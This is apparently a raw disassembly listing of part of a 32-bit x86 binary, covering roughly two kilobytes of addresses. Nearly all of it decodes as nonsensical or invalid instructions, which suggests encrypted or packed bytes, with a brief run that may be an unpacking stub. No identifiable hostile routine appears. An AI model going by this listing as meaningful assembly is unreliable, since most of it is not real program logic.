  40a9b5:	push   edx
  40a9b6:	push   0x20ff273c
  40a9bb:	xor    BYTE PTR ds:0x87808dac,ah
  40a9c1:	sbb    bl,BYTE PTR [edi]
  40a9c3:	shl    bl,0xf
  40a9c6:	int3   
  40a9c7:	add    DWORD PTR [edi+0x61],0x45
  40a9cb:	dec    ecx
  40a9cc:	scas   eax,DWORD PTR es:[edi]
  40a9cd:	cdq    
  40a9ce:	xchg   edi,eax
  40a9cf:	mov    edi,DWORD PTR [eax-0x35fcf3ef]
  40a9d5:	sbb    DWORD PTR [esi+0x62],ebp
  40a9d8:	pop    ebp
  40a9d9:	nop
  40a9da:	adc    dh,BYTE PTR ds:0xf6354637
  40a9e0:	(bad)  
  40a9e1:	adc    DWORD PTR [edx],ecx
  40a9e3:	or     eax,0xc8b9dc36
  40a9e8:	mov    dh,0x92
  40a9ea:	test   BYTE PTR [ecx],bl
  40a9ec:	dec    esi
  40a9ed:	pushf  
  40a9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9ef:	fwait
  40a9f0:	sub    DWORD PTR [edi+0x37],ebp
  40a9f3:	jle    0x40a99c
  40a9f5:	test   bh,bh
  40a9f7:	xor    eax,0x9a19fcfd
  40a9fc:	out    dx,al
  40a9fd:	add    DWORD PTR [ebx],eax
  40a9ff:	adc    ebp,DWORD PTR [edi-0x50]
  40aa02:	dec    ecx
  40aa03:	push   ds
  40aa04:	popa   
  40aa05:	sti    
  40aa06:	mov    dh,0xc5
  40aa08:	mov    eax,0x844841e3
  40aa0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa0e:	es cmp eax,0x5e8e1939
  40aa14:	int3   
  40aa15:	stos   BYTE PTR es:[edi],al
  40aa16:	add    ebp,DWORD PTR [edx+esi*4+0x4e4631bb]
  40aa1d:	xor    dl,BYTE PTR ds:[ebx+edx*2+0x7d]
  40aa22:	xor    ebp,ebp
  40aa24:	xchg   ebx,eax
  40aa25:	jmp    0x3622:0x15f2f3cc
  40aa2c:	pop    ss
  40aa2d:	dec    ebx
  40aa2e:	arpl   bx,di
  40aa30:	popa   
  40aa31:	ss dec esp
  40aa33:	sub    ch,BYTE PTR [esi+0x1cbf3712]
  40aa39:	add    BYTE PTR [esi-0x5a546fac],cl
  40aa3f:	cmc    
  40aa40:	or     al,0x95
  40aa42:	retf   
  40aa43:	jmp    0x40aac3
  40aa45:	mov    edx,0x36d2598f
  40aa4a:	and    ebx,esp
  40aa4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa4d:	adc    BYTE PTR [ebx+edi*4-0x6c1f1236],0xdd
  40aa55:	aam    0xdc
  40aa57:	out    dx,al
  40aa58:	pop    ebx
  40aa5a:	mov    WORD PTR ds:[esi+eax*8+0x5a12be2e],es
  40aa62:	(bad)  
  40aa63:	in     eax,dx
  40aa64:	call   0x69639f94
  40aa69:	mov    eax,0xbcd133a5
  40aa6e:	js     0x40a9f3
  40aa70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa71:	add    cl,BYTE PTR cs:[ecx-0x4b]
  40aa75:	or     al,0xe6
  40aa77:	adc    cl,BYTE PTR [eax+0x704531ae]
  40aa7d:	push   0xdf6120ed
  40aa82:	mov    dl,0xf9
  40aa84:	fidivr DWORD PTR [edi+0x34]
  40aa87:	in     al,0xc
  40aa89:	xchg   BYTE PTR [ecx+0x56],dh
  40aa8c:	shr    BYTE PTR [ebx],0x2f
  40aa8f:	repz add BYTE PTR [ecx+0x26],0xd7
  40aa94:	xchg   ebx,eax
  40aa95:	sbb    edx,esi
  40aa97:	dec    ebx
  40aa98:	pop    edi
  40aa99:	loop   0x40ab0e
  40aa9b:	sub    BYTE PTR [ebp+0x5331e45b],dl
  40aaa1:	scas   eax,DWORD PTR es:[edi]
  40aaa2:	lods   eax,DWORD PTR ds:[esi]
  40aaa3:	imul   DWORD PTR [ebx+0xdc99260]
  40aaa9:	test   eax,0xc0369f1
  40aaae:	jp     0x40aaa9
  40aab0:	call   0xa9940261
  40aab5:	ins    DWORD PTR es:[edi],dx
  40aab6:	test   DWORD PTR [edx+0x358f1eb1],ecx
  40aabc:	(bad)  
  40aabd:	mov    dh,0x4a
  40aabf:	push   ecx
  40aac0:	jg     0x40ab24
  40aac2:	pusha  
  40aac3:	ret    
  40aac4:	mov    DWORD PTR [ebx-0x5253a13d],esp
  40aaca:	xchg   DWORD PTR ds:0x7d5e8772,esp
  40aad0:	mov    dl,0xb3
  40aad2:	mov    DWORD PTR [eax+0x8],ebp
  40aad5:	mov    ebp,0x96957713
  40aada:	adc    eax,0xb55b67c5
  40aadf:	xchg   esp,eax
  40aae0:	repnz arpl WORD PTR [edi+eiz*2+0x51b32989],di
  40aae8:	and    dl,cl
  40aaea:	jmp    0x239dfacd
  40aaef:	and    ebp,DWORD PTR [ebp*8+0x4e4e423b]
  40aaf6:	loope  0x40ab75
  40aaf8:	into   
  40aaf9:	pop    es
  40aafa:	inc    esi
  40aafb:	scas   al,BYTE PTR es:[edi]
  40aafc:	leave  
  40aafd:	xchg   esi,eax
  40aafe:	jbe    0x40ab17
  40ab00:	ror    BYTE PTR [ebx+0x551f4af],cl
  40ab06:	xor    eax,0x39bdbfb6
  40ab0b:	xchg   ebp,eax
  40ab0c:	mov    bh,0xc8
  40ab0e:	push   eax
  40ab0f:	dec    esi
  40ab10:	(bad)
  40ab14:	lods   al,BYTE PTR ds:[esi]
  40ab15:	sub    esi,ebx
  40ab17:	scas   al,BYTE PTR es:[edi]
  40ab18:	xchg   esp,eax
  40ab19:	cmp    al,0x94
  40ab1b:	fcom   QWORD PTR [eax]
  40ab1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab1e:	stos   DWORD PTR es:[edi],eax
  40ab1f:	test   WORD PTR [edi-0x6e],si
  40ab23:	cli    
  40ab24:	jp     0x40ab2f
  40ab26:	rcr    BYTE PTR [ebp-0x334ba429],1
  40ab2c:	ficom  DWORD PTR [edi+0x37]
  40ab2f:	shl    BYTE PTR gs:[ebx],0x6b
  40ab33:	xor    eax,0xb215e730
  40ab38:	jp     0x40aac5
  40ab3a:	in     eax,dx
  40ab3b:	mov    cl,0x5a
  40ab3d:	cdq    
  40ab3e:	int    0xe1
  40ab40:	aaa    
  40ab41:	push   ebp
  40ab42:	push   esp
  40ab43:	mov    ebp,0xc69a91a2
  40ab48:	aad    0xc5
  40ab4a:	(bad)  
  40ab4b:	mov    ds:0xb56906c1,al
  40ab50:	sbb    ah,BYTE PTR [edi+0x40a627b9]
  40ab56:	adc    eax,0x45c626eb
  40ab5b:	test   al,0x95
  40ab5d:	cld    
  40ab5e:	cli    
  40ab5f:	add    al,0x81
  40ab61:	mov    al,0xb2
  40ab63:	stos   DWORD PTR es:[edi],eax
  40ab64:	mov    bl,0xbe
  40ab66:	dec    edx
  40ab67:	sti    
  40ab68:	xchg   esp,edx
  40ab6a:	and    edx,DWORD PTR [ecx]
  40ab6c:	push   eax
  40ab6d:	in     al,0xa4
  40ab6f:	cwde   
  40ab70:	int    0x1b
  40ab72:	jno    0x40ab5a
  40ab74:	add    al,0x9c
  40ab76:	mov    ebx,0x5261ca8e
  40ab7b:	pop    ds
  40ab7c:	sti    
  40ab7d:	lods   al,BYTE PTR ds:[esi]
  40ab7e:	mov    ds:0x9949a140,eax
  40ab83:	lahf   
  40ab84:	out    0x4b,eax
  40ab86:	and    DWORD PTR [ebp+0x35],0xe5de13ca
  40ab8d:	in     al,0xc7
  40ab8f:	push   edx
  40ab90:	jbe    0x40ab9b
  40ab92:	mov    dh,BYTE PTR [ebx-0x1dec949e]
  40ab98:	test   DWORD PTR ds:0x26913ff3,edx
  40ab9e:	in     eax,0x82
  40aba0:	mov    ebp,0x930a69be
  40aba5:	aam    0x2
  40aba7:	fadd   DWORD PTR [edx-0x693ce722]
  40abad:	xchg   ecx,eax
  40abae:	in     eax,dx
  40abaf:	stos   BYTE PTR es:[edi],al
  40abb0:	sub    al,0xb2
  40abb2:	jl     0x40ab84
  40abb4:	popa   
  40abb5:	mov    eax,cs
  40abb7:	mov    eax,0xcf133d7e
  40abbc:	pop    ss
  40abbd:	push   ss
  40abbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abbf:	icebp  
  40abc0:	loope  0x40abe2
  40abc2:	fs scas eax,DWORD PTR es:[edi]
  40abc4:	aam    0xd6
  40abc6:	sbb    eax,0x1febaff9
  40abcb:	lods   al,BYTE PTR ds:[esi]
  40abcc:	and    eax,0xcafd1c3e
  40abd1:	pop    ebp
  40abd2:	add    eax,0x4a87da9d
  40abd7:	fbld   TBYTE PTR [esi-0x21]
  40abda:	stos   BYTE PTR es:[edi],al
  40abdb:	fdiv   DWORD PTR [ebp+0x2c]
  40abde:	dec    ebp
  40abdf:	inc    ecx
  40abe0:	add    eax,0x7f11b0e3
  40abe5:	out    dx,al
  40abe6:	sahf   
  40abe7:	test   eax,0xd7f2bd8b
  40abec:	iret   
  40abed:	stos   DWORD PTR es:[edi],eax
  40abee:	hlt    
  40abef:	(bad)  
  40abf0:	pushf  
  40abf1:	xchg   esp,eax
  40abf2:	or     eax,0x84eb8ad2
  40abf7:	idiv   dl
  40abf9:	jne    0x40ac65
  40abfb:	lods   eax,DWORD PTR ds:[esi]
  40abfc:	add    eax,0x6b5999b9
  40ac01:	(bad)  
  40ac02:	cdq    
  40ac03:	ror    DWORD PTR ds:0x7fb697a4,cl
  40ac09:	xchg   ebx,eax
  40ac0a:	out    0x4b,eax
  40ac0c:	daa    
  40ac0d:	dec    ecx
  40ac0e:	std    
  40ac0f:	push   edx
  40ac10:	inc    eax
  40ac11:	dec    ebx
  40ac12:	leave  
  40ac13:	mov    al,ds:0x2b5b088c
  40ac18:	imul   esi,DWORD PTR ds:0x3a6cfdd0,0xeb21160b
  40ac22:	pop    ebp
  40ac23:	stos   DWORD PTR es:[edi],eax
  40ac24:	mov    cl,0x89
  40ac26:	xchg   edx,eax
  40ac27:	and    eax,0xf4402852
  40ac2c:	mov    DWORD PTR [ebx+0x707e208c],edx
  40ac32:	xchg   ebx,eax
  40ac33:	or     al,0xc3
  40ac35:	call   0xb4fc93b5
  40ac3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac3b:	push   ebx
  40ac3c:	out    dx,al
  40ac3d:	shl    ebp,0x6c
  40ac40:	stos   BYTE PTR es:[edi],al
  40ac41:	shl    BYTE PTR [ebx+0x45cbee70],0xd1
  40ac48:	pop    esi
  40ac49:	sbb    ecx,DWORD PTR [eax+esi*1-0x148e7530]
  40ac50:	nop
  40ac51:	pushf  
  40ac52:	sbb    eax,0x357209f7
  40ac57:	push   ss
  40ac58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac59:	lock scas al,BYTE PTR es:[edi]
  40ac5b:	popa   
  40ac5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac5d:	out    0x83,eax
  40ac5f:	retf   0x1f90
  40ac62:	pop    edx
  40ac63:	leave  
  40ac64:	xchg   esp,eax
  40ac65:	test   al,0x2b
  40ac67:	popf   
  40ac68:	test   al,0xc3
  40ac6a:	leave  
  40ac6b:	into   
  40ac6c:	add    al,0xed
  40ac6e:	or     eax,0x3b847cbe
  40ac73:	into   
  40ac74:	imul   ch
  40ac76:	lods   eax,DWORD PTR ds:[esi]
  40ac77:	ds loope 0x40ac74
  40ac7a:	in     al,dx
  40ac7b:	imul   esp,DWORD PTR [ebx-0x5d],0xffffff8d
  40ac7f:	sub    esi,ebx
  40ac81:	out    0xf8,eax
  40ac83:	(bad)  [ebx]
  40ac85:	data16 jbe 0x40acf7
  40ac88:	retf   
  40ac89:	int3   
  40ac8a:	(bad)  
  40ac8b:	cmc    
  40ac8c:	test   al,0xcd
  40ac8e:	scas   al,BYTE PTR es:[edi]
  40ac8f:	je     0x40ac38
  40ac91:	sti    
  40ac92:	or     edx,DWORD PTR [eax+0x472f2ae8]
  40ac98:	jmp    FWORD PTR [eax]
  40ac9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac9b:	std    
  40ac9c:	cmp    eax,0x97fa33e7
  40aca1:	das    
  40aca2:	jns    0x40ac5b
  40aca4:	pop    edi
  40aca5:	(bad)  
  40aca7:	xchg   edi,eax
  40aca8:	pop    ds
  40aca9:	mov    ecx,0x88c9a53f
  40acae:	and    dh,BYTE PTR [edx]
  40acb0:	je     0x40ac98
  40acb2:	pop    eax
  40acb3:	bound  eax,QWORD PTR [eax]
  40acb5:	mov    ecx,0x27dfc22e
  40acba:	dec    edi
  40acbb:	inc    esp
  40acbc:	xor    dh,bh
  40acbe:	cmp    al,0x94
  40acc0:	mov    ebp,DWORD PTR [ebp+ecx*4-0x5c]
  40acc4:	repz xor ebp,DWORD PTR [ecx]
  40acc7:	clc    
  40acc8:	add    DWORD PTR [edx+0x15],ebx
  40accb:	inc    edi
  40accc:	lea    ebp,[ecx]
  40acce:	dec    edx
  40accf:	pop    edi
  40acd0:	test   al,0xe8
  40acd2:	(bad)  
  40acd3:	(bad)  
  40acd4:	and    DWORD PTR [ebx+0x3e],ecx
  40acd7:	mov    bl,0xf4
  40acd9:	pop    ds
  40acda:	mov    ebp,0xfd9f26d9
  40acdf:	data16 fidiv WORD PTR [edx]
  40ace2:	not    eax
  40ace4:	adc    eax,0x41ed0fda
  40ace9:	mov    eax,0x54cdac5e
  40acee:	test   BYTE PTR [edx-0x13c7f9db],dl
  40acf4:	je     0x40ad12
  40acf6:	into   
  40acf7:	cld    
  40acf8:	(bad)  
  40acf9:	xor    al,0xd4
  40acfb:	idiv   DWORD PTR ds:[edx-0x7d]
  40acff:	xchg   ebp,eax
  40ad00:	js     0x40ace3
  40ad02:	(bad)  [edx]
  40ad04:	mov    al,ds:0xc74d7eea
  40ad09:	push   esp
  40ad0a:	(bad)  
  40ad0c:	mov    al,0x6a
  40ad0e:	std    
  40ad0f:	nop
  40ad10:	ret    0xb0a7
  40ad13:	sbb    esi,DWORD PTR [ebp+ebx*8+0x4f0e079b]
  40ad1a:	mov    bh,0xe1
  40ad1c:	add    al,0x51
  40ad1e:	push   ds
  40ad1f:	inc    eax
  40ad20:	mov    ah,0xca
  40ad22:	mov    esp,0x731e23a6
  40ad27:	sub    BYTE PTR [esi],bh
  40ad29:	sub    BYTE PTR [ebx-0x14350045],0x6d
  40ad30:	fadd   QWORD PTR [eax]
  40ad32:	add    DWORD PTR [eax-0x777f61e1],esi
  40ad38:	popf   
  40ad39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad3a:	sub    ah,al
  40ad3c:	push   esi
  40ad3d:	in     al,0x9b
  40ad3f:	data16 fwait
  40ad41:	ins    BYTE PTR es:[edi],dx
  40ad42:	jo     0x40adc1
  40ad44:	int    0x88
  40ad46:	in     al,dx
  40ad47:	scas   eax,DWORD PTR es:[edi]
  40ad48:	or     BYTE PTR [ebp+0x6],0x3f
  40ad4c:	rcl    BYTE PTR [eax+0x4611be44],0x9c
  40ad53:	push   es
  40ad54:	ret    0x9a6
  40ad57:	add    eax,0x264bf21b
  40ad5c:	bound  ebx,QWORD PTR [edx+eax*4-0x12]
  40ad60:	jo     0x40ad62
  40ad62:	mov    eax,0xb156ea55
  40ad67:	rol    DWORD PTR [ebx-0x11],1
  40ad6a:	sahf   
  40ad6b:	(bad)  
  40ad6c:	push   ebp
  40ad6d:	sub    DWORD PTR [edx+edx*2-0x23],eax
  40ad71:	pop    edi
  40ad72:	ins    DWORD PTR es:[edi],dx
  40ad73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad74:	cli    
  40ad75:	push   ecx
  40ad76:	mov    ah,0x95
  40ad78:	mov    ds:0xaf49c143,eax
  40ad7d:	adc    al,0x8f
  40ad7f:	mov    eax,ds:0x55c03889
  40ad84:	call   0x7b061850
  40ad89:	cmp    DWORD PTR [eax+0x3d],0xcc426509
  40ad90:	push   eax
  40ad91:	clc    
  40ad92:	(bad)  
  40ad93:	out    dx,al
  40ad94:	jmp    0x852aedf0
  40ad99:	mov    ecx,0x270ca2a
  40ad9e:	cmp    dl,BYTE PTR fs:[esi-0x5b128dfe]
  40ada5:	mov    bh,0x9e
  40ada7:	lock push 0xffffffc0
  40adaa:	push   esp
  40adab:	imul   DWORD PTR [edx+0x59]
  40adae:	xor    DWORD PTR [ebp-0x3e01e5ec],eax
  40adb4:	mov    esi,0x37a0b29d
  40adb9:	lds    ebp,FWORD PTR [ebp-0x61]
  40adbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adbd:	int3   
  40adbe:	cmp    BYTE PTR [ecx-0x1d10dece],0x32
  40adc5:	out    dx,al
  40adc6:	mov    ebp,0x39b81554
  40adcb:	xchg   esp,eax
  40adcc:	inc    ebx
  40adcd:	mov    ds:0xc082d976,al
  40add2:	sbb    eax,0x22cec15b
  40add7:	out    0x46,eax
  40add9:	or     dl,BYTE PTR [edx*1+0xcc2951e]
  40ade0:	adc    BYTE PTR [esi-0x5d3d07a6],bh
  40ade6:	out    dx,eax
  40ade7:	jb     0x40adae
  40ade9:	xchg   ecx,eax
  40adea:	int3   
  40adeb:	or     edx,0xffffffb3
  40adee:	aad    0x17
  40adf0:	mov    eax,0x22364
  40adf5:	mov    ?,WORD PTR [esi-0x1825b6be]
  40adfb:	out    0xb2,eax
  40adfd:	mov    bl,0x2c
  40adff:	loop   0x40ada7
  40ae01:	xor    al,0xac
  40ae03:	(bad)  
  40ae04:	shr    BYTE PTR [esi-0x536ef4d9],1
  40ae0a:	stos   BYTE PTR es:[edi],al
  40ae0b:	stc    
  40ae0c:	jmp    0x40ae3e
  40ae0e:	pop    ds
  40ae0f:	(bad)  
  40ae11:	fistp  WORD PTR [esi-0x6044be13]
  40ae17:	xlat   BYTE PTR ds:[ebx]
  40ae18:	pop    esi
  40ae19:	push   ebp
  40ae1a:	mov    ebx,0x6308752f
  40ae1f:	leave  
  40ae20:	hlt    
  40ae21:	sub    DWORD PTR [edx],eax
  40ae23:	sbb    eax,0x3cf7d12a
  40ae28:	stc    
  40ae29:	mov    DWORD PTR gs:[ebx-0x17],edx
  40ae2d:	cs or  al,0x4d
  40ae30:	cmp    al,0x26
  40ae32:	fs loope 0x40adc0
  40ae35:	outs   dx,BYTE PTR ds:[esi]
  40ae36:	(bad)  
  40ae37:	in     eax,0x3f
  40ae39:	xor    al,0x24
  40ae3b:	dec    eax
  40ae3c:	and    dl,ch
  40ae3e:	and    bh,dh
  40ae40:	fcom   DWORD PTR [esi+0x243a8895]
  40ae46:	fsub   QWORD PTR [edi+0x1a43c2ce]
  40ae4c:	xor    DWORD PTR [eax],edi
  40ae4e:	fidiv  DWORD PTR [ebx-0x5e]
  40ae51:	(bad)  
  40ae53:	iret   
  40ae54:	jle    0x40ae6f
  40ae56:	push   0x79
  40ae58:	imul   esi,ebp,0xffffffc7
  40ae5b:	sbb    BYTE PTR [eax-0xc],bh
  40ae5e:	fmul   QWORD PTR [edi]
  40ae60:	ins    BYTE PTR es:[edi],dx
  40ae61:	stos   BYTE PTR es:[edi],al
  40ae62:	sbb    eax,0xabc58cdd
  40ae67:	scas   al,BYTE PTR es:[edi]
  40ae68:	mov    BYTE PTR [esi+edi*2-0x798d5712],bh
  40ae6f:	aas    
  40ae70:	inc    edx
  40ae71:	push   ebx
  40ae72:	cli    
  40ae73:	or     al,0x0
  40ae75:	lods   al,BYTE PTR ds:[esi]
  40ae76:	inc    ebp
  40ae77:	shl    DWORD PTR [ecx],0xce
  40ae7a:	cmp    eax,DWORD PTR [edi-0x13]
  40ae7d:	or     al,0x12
  40ae7f:	in     al,dx
  40ae80:	inc    edi
  40ae81:	jb     0x40ae57
  40ae83:	xor    al,0x70
  40ae85:	ins    BYTE PTR es:[edi],dx
  40ae86:	cmp    ecx,DWORD PTR ds:0x3cefe427
  40ae8c:	into   
  40ae8d:	adc    cl,bl
  40ae8f:	shl    DWORD PTR [eax-0x11],cl
  40ae92:	fcomp  DWORD PTR [edx+0x48da8fb1]
  40ae98:	loope  0x40aed9
  40ae9a:	out    0xc9,eax
  40ae9c:	(bad)  
  40ae9d:	push   ebx
  40ae9e:	out    dx,al
  40ae9f:	rcl    BYTE PTR ds:0x4d1e5a02,0x2a
  40aea6:	(bad)  
  40aea7:	sub    esi,edx
  40aea9:	jmp    0x7659e4f9
  40aeae:	lock das 
  40aeb0:	aas    
  40aeb1:	repnz sbb eax,esi
  40aeb4:	sub    BYTE PTR ds:0x1be1f15c,cl
  40aeba:	and    bh,ah
  40aebc:	pop    esp
  40aebd:	lock xor al,0x4a
  40aec0:	or     eax,0xbf0bf399
  40aec5:	cli    
  40aec6:	or     eax,0xf48fb72
  40aecb:	scas   eax,DWORD PTR es:[edi]
  40aecc:	push   ds
  40aecd:	dec    edi
  40aece:	jle    0x40aeb0
  40aed0:	test   DWORD PTR [eax+0x1b],ebx
  40aed3:	xchg   ebp,eax
  40aed4:	loop   0x40aefb
  40aed6:	cmp    al,0x5a
  40aed8:	clc    
  40aed9:	(bad)  
  40aeda:	push   ebx
  40aedb:	leave  
  40aedc:	or     bl,ch
  40aede:	in     eax,0x70
  40aee0:	inc    edi
  40aee1:	retf   
  40aee2:	jbe    0x40ae7d
  40aee4:	pop    edi
  40aee5:	iret   
  40aee6:	push   edi
  40aee7:	ds adc dh,ah
  40aeea:	fbld   TBYTE PTR [edi-0x36]
  40aeed:	stc    
  40aeee:	jp     0x40ae91
  40aef0:	jne    0x40ae82
  40aef2:	das    
  40aef3:	push   ebx
  40aef4:	into   
  40aef5:	mov    cl,ah
  40aef7:	dec    ebx
  40aef8:	inc    eax
  40aef9:	leave  
  40aefa:	(bad)  
  40aefb:	sti    
  40aefc:	jne    0x40ae98
  40aefe:	jle    0x40af11
  40af00:	push   edi
  40af01:	xor    ah,bl
  40af03:	fisubr WORD PTR [ecx+0x9]
  40af06:	imul   BYTE PTR [esi]
  40af08:	imul   esp,DWORD PTR [esi+0x4720ec73],0xffffffc7
  40af0f:	jg     0x40aede
  40af11:	jg     0x40aef4
  40af13:	cdq    
  40af14:	enter  0x91b7,0x44
  40af18:	shr    ebx,0xfc
  40af1b:	ret    0x4a12
  40af1e:	mov    gs,edi
  40af20:	pop    eax
  40af21:	pop    eax
  40af22:	stos   DWORD PTR es:[edi],eax
  40af23:	add    eax,0xcfeb1fc8
  40af28:	jb     0x40aec2
  40af2a:	int    0x15
  40af2c:	jp     0x40aedd
  40af2e:	and    eax,0x4e54aa1c
  40af33:	in     al,0xa4
  40af35:	ds dec ebx
  40af37:	xchg   ebp,eax
  40af38:	adc    eax,0x2682ecef
  40af3d:	mov    bl,0xa8
  40af3f:	adc    ebp,ecx
  40af41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af42:	fcom   QWORD PTR [edx+0x1c]
  40af45:	sbb    eax,0xd36d0953
  40af4a:	retf   0x60b
  40af4d:	push   edi
  40af4e:	lods   eax,DWORD PTR ds:[esi]
  40af50:	ins    BYTE PTR es:[edi],dx
  40af51:	jmp    0x40af47
  40af53:	mov    dh,0x50
  40af55:	cmp    BYTE PTR [ecx+eiz*1],dh
  40af58:	push   esi
  40af59:	lahf   
  40af5a:	ficom  WORD PTR [eax]
  40af5c:	mov    es,WORD PTR [esi]
  40af5e:	jl     0x40aefe
  40af60:	test   DWORD PTR [edi+0x49fb7ccb],ebx
  40af66:	add    DWORD PTR [edi-0x520eb7a2],ebp
  40af6c:	mov    ds:0x221b6ebf,al
  40af71:	xor    BYTE PTR ds:0x71c7bb79,ch
  40af77:	mov    ebx,0x5f09fd39
  40af7c:	aad    0xc0
  40af7e:	xchg   ebx,eax
  40af7f:	add    BYTE PTR [edx-0x4a72a033],cl
  40af85:	and    eax,0x9d6f6b61
  40af8a:	dec    ecx
  40af8b:	inc    ecx
  40af8c:	add    BYTE PTR [ecx-0x1875c8b3],dh
  40af92:	sbb    al,0xb1
  40af94:	lock stos BYTE PTR es:[edi],al
  40af96:	mov    edx,0xf2068498
  40af9b:	fidiv  WORD PTR [edx+0x5d]
  40af9e:	sbb    BYTE PTR [edx+ecx*2-0x639b9c53],bl
  40afa5:	xchg   ecx,eax
  40afa6:	mov    edi,0xf2f9b1b0
  40afab:	sbb    edi,DWORD PTR [ecx]
  40afad:	out    dx,eax
  40afae:	sbb    al,0xbb
  40afb0:	mov    esp,0x1ab2cc37
  40afb5:	rcr    DWORD PTR [esi],cl
  40afb7:	jl     0x40af86
  40afb9:	cmp    al,0x16
  40afbb:	int3   
  40afbc:	test   eax,0x8a619423
  40afc1:	mov    ds:0x5593b9fa,al
  40afc6:	push   0x2d500418
  40afcb:	enter  0x8be2,0x45
  40afcf:	cld    
  40afd0:	xor    eax,esi
  40afd2:	add    eax,edi
  40afd4:	mov    DWORD PTR [ebp-0x10],eax
  40afd7:	mov    ebx,0x65655
  40afdc:	add    ebx,0x3234
  40afe2:	xchg   ebx,esi
  40afe4:	xor    ebx,ebx
  40afe6:	push   esi
  40afe7:	mov    esi,ebx
  40afe9:	pop    ebx
  40afea:	mov    edx,esi
  40afec:	jmp    0x40d37e
  40aff1:	cli    
  40aff2:	mov    DWORD PTR [ecx-0x65b47dad],esi
  40aff8:	add    BYTE PTR ds:0xd29b0d0,0xa8
  40afff:	test   eax,0x83f42906
  40b004:	or     DWORD PTR [esi+ebx*2],0xffffff83
  40b008:	adc    DWORD PTR [eax+0x26],0xfffffff9
  40b00c:	mov    ebx,DWORD PTR es:[eax-0x1ba32441]
  40b013:	add    al,0x83
  40b015:	add    esp,DWORD PTR [edx*1-0x7ada4864]
  40b01c:	xor    al,0x11
  40b01e:	push   ebx
  40b01f:	sub    edi,DWORD PTR [edx]
  40b021:	pop    ebx
  40b022:	push   eax
  40b023:	lds    ecx,FWORD PTR [ebx-0xa6511af]
  40b029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b02a:	pop    esi
  40b02b:	and    DWORD PTR [eax-0x17527601],ebx
  40b031:	dec    edx
  40b032:	stos   DWORD PTR es:[edi],eax
  40b033:	(bad)  
  40b034:	les    ebp,FWORD PTR [ebx-0xe3a1a4f]
  40b03a:	pop    ss
  40b03b:	jp     0x40b00d
  40b03d:	and    BYTE PTR fs:[eax+ebx*2+0x43],bl
  40b042:	mov    edx,0x1528ddc7
  40b047:	test   DWORD PTR [esi+0x329cf757],ebx
  40b04d:	(bad)  
  40b04e:	cmp    bl,dl
  40b050:	int3   
  40b051:	loopne 0x40b08a
  40b053:	push   0x6d721e4
  40b058:	fs cmp al,0xe5
  40b05b:	mov    eax,0xef04a622
  40b060:	ins    DWORD PTR es:[edi],dx
  40b061:	pop    eax
  40b062:	mov    ebp,0xb0232930
  40b067:	push   eax
  40b068:	xchg   edx,eax
  40b069:	and    eax,0x46362157
  40b06e:	jo     0x40b034
  40b070:	add    DWORD PTR [edx],ecx
  40b072:	mov    ebp,0xb032da9c
  40b077:	pop    ds
  40b078:	out    dx,al
  40b079:	jg     0x40b0c0
  40b07b:	lahf   
  40b07c:	stos   BYTE PTR es:[edi],al
  40b07d:	dec    ebx
  40b07e:	add    al,0x7a
  40b080:	in     al,dx
  40b081:	cs pop ss
  40b083:	mov    eax,0x1ca4c694
  40b088:	dec    edi
  40b089:	aaa    
  40b08a:	and    esp,edi
  40b08c:	dec    esi
  40b08d:	jnp    0x40b0b2
  40b08f:	cmp    ebx,esp
  40b091:	push   edx
  40b092:	int    0x5b
  40b094:	sbb    al,0xdc
  40b096:	movq   mm0,mm7
  40b099:	(bad)  
  40b09a:	push   ebx
  40b09b:	jmp    0x40b02d
  40b09d:	ss pushf 
  40b09f:	xchg   ebx,eax
  40b0a0:	jmp    0x3614c4be
  40b0a5:	ret    0x6bd5
  40b0a8:	and    al,0xbe
  40b0aa:	adc    BYTE PTR ds:0xc587236a,ch
  40b0b0:	(bad)  
  40b0b1:	scas   eax,DWORD PTR es:[edi]
  40b0b2:	pushf  
  40b0b3:	(bad)  
  40b0b4:	int3   
  40b0b5:	xchg   esp,eax
  40b0b6:	test   BYTE PTR ds:0xe3fdef8c,dl
  40b0bc:	jle    0x40b095
  40b0be:	adc    BYTE PTR [esi-0xe],0x9a
  40b0c2:	adc    edx,esi
  40b0c4:	sub    BYTE PTR [edi+ebx*4],ch
  40b0c7:	cmp    ecx,DWORD PTR [ebx-0x62830032]
  40b0cd:	hlt    
  40b0ce:	sbb    eax,0xc7f17ab8
  40b0d3:	xor    BYTE PTR [eax+eax*8-0x3c],ah
  40b0d7:	ret    
  40b0d8:	fdiv   st,st(3)
  40b0da:	mov    ah,BYTE PTR ds:0x5c054a21
  40b0e0:	fistp  QWORD PTR [edi+0x7d]
  40b0e3:	sbb    DWORD PTR [ecx],ecx
  40b0e5:	inc    esi
  40b0e6:	int    0x5e
  40b0e8:	mov    eax,DWORD PTR [esi]
  40b0ea:	outs   dx,DWORD PTR ds:[esi]
  40b0eb:	scas   al,BYTE PTR es:[edi]
  40b0ec:	je     0x40b0da
  40b0ee:	xchg   BYTE PTR [esi],ah
  40b0f0:	and    dl,BYTE PTR [ebx]
  40b0f2:	xor    BYTE PTR [eax+0x41],bh
  40b0f5:	test   DWORD PTR [ebx+0x36],edi
  40b0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f9:	push   ebx
  40b0fa:	push   es
  40b0fb:	daa    
  40b0fc:	in     eax,dx
  40b0fd:	jle    0x40b158
  40b0ff:	xchg   esp,eax
  40b100:	inc    esp
  40b101:	nop
  40b102:	adc    al,0x65
  40b104:	loopne 0x40b12b
  40b106:	mov    bl,0x5a
  40b108:	cwde   
  40b109:	daa    
